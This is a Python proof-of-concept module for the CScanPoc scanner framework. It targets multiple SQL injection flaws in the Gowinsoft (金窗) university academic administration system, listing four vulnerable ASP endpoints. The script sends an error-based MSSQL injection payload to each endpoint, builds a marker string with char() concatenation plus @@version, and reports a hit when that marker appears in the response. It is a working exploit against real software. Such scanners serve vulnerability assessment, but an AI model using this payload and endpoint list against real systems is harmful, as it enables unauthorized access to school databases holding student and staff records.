# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Gowinsoft_0002'  # 平台漏洞编号，留空
    name = '金窗教务系统存在多处SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-18'  # 漏洞公布时间
    desc = '''
        金窗教务管理系统是为高校数字校园建设提供的技术解决方案。
        金窗教务系统存在多处SQL .net+sqlserver注射漏洞。
        "/jiaoshi/shizi/shizi/textbox.asp?id=1"
        "/jiaoshi/sj/shixi/biyeshan1.asp?id=1"
        "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1"
        "/jiaoshi/xueji/shen/autobh.asp?jh=1"
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0101234'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金窗教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '297c35b6-ca5c-478d-b6b1-f7cedd0a525d'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                "/jiaoshi/shizi/shizi/textbox.asp?id=1",
                "/jiaoshi/sj/shixi/biyeshan1.asp?id=1",
                "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
                "/jiaoshi/xueji/shen/autobh.asp?jh=1"
            ]

            data = "%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a"
            for url in urls:
                vul = arg + url + data
                code, head, res, errcode, _ = hh.http(vul)
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=vul))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
